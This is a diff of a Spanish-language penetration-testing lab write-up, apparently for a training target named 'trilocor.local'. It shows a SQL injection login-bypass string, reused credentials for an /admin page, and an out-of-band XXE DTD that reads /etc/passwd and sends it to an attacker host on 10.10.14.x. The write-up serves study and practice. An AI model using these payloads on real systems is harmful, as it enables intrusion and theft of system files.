@@ -249,13 +249,13 @@ http://trilocor.local:8088/index.php?username=%27or+%271%27%3D%271%27--+-&passwo
 
 ### Public Relations PR (8009)
 
-<figure><img src="../.gitbook/assets/image (1743).png" alt=""><figcaption></figcaption></figure>
+<div><figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 104947.png" alt=""><figcaption></figcaption></figure> <figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 104928.png" alt=""><figcaption></figcaption></figure></div>
 
 Entramos en el **/admin** y reutilizamos las credenciales.
 
-
-
 `pr-martins:martins`
+
+<figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 105204.png" alt=""><figcaption></figcaption></figure>
 
 #### XXE Out-of-band
 
@@ -264,8 +264,6 @@ Se crea el archivo **xxe.dtd**.
 ```
 <!ENTITY % file SYSTEM "php:-/filter/convert.base64-
 encode/resource=/etc/passwd">
-<!ENTITY % oob "<!ENTITY content SYSTEM 'http:-/10.10.14.118:8001/?
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http:-/10.10.14.223:8004/?
 content=%file;'>">
 ```
-
-au
